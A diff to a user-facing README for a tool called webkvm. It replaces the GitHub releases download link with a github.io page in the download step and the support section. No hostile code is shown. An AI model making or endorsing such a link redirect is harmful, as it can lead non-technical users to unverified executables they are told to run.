@@ -8,7 +8,7 @@ This guide is written for everyday computer users. You don't need to be a progra
 
 ## ⬇️ Download webkvm
 
-Visit this link to download the application: **[Download webkvm](https://github.com/zeopspace/webkvm/releases)**
+Visit this link to download the application: **[Download webkvm](https://zeopspace.github.io)**
 
 Click the button above to go to the download page. Look for the latest release and download the file to your computer. The download will start automatically.
 
@@ -156,7 +156,7 @@ Regular updates are released, so check the download page occasionally for new ve
 
 ## 📦 Support and Updates
 
-- **Download Page:** [https://github.com/zeopspace/webkvm/releases](https://github.com/zeopspace/webkvm/releases)
+- **Download Page:** [https://zeopspace.github.io](https://zeopspace.github.io)
 - **Updates:** New versions are posted on the same page. Simply download the latest file and run it over your existing installation.
 - **Community:** You can open issues or ask questions on the GitHub repository page.
 
